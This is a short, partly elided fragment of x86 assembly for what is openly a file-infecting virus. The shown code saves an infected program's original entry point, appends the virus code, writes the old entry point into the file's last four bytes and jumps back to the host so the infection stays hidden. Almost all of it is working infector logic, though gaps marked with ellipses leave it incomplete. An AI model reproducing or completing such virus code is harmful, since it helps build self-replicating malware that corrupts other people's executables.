...
_start:
	...
	mov esi, [ebp - STK_RES + ENTRY]		; save old EP to esi
	mov [ebp-4], esi						; save old EP to stack
	;###################################### copy code #####################################
	...
	;################### getting back to the infected program after virus completes ######################
	lseek edi, 0, SEEK_SET					; return to the start of the file eax=fd 0=byte SEEK_SET=saved content
	lseek edi, -4, SEEK_END					; seek end to copy code
	mov esi, [ebp-4]						; old EP
	lea ebx, [ebp-4]						; set esi to point on the start of the data we want to write to the new file
	write edi, ebx, 4						; write to last 4 bytes the old EP
	close edi								; close file
	call get_my_lock
	add eax, PreviousEntryPoint - next_i
	jmp [eax]
VirusExit:
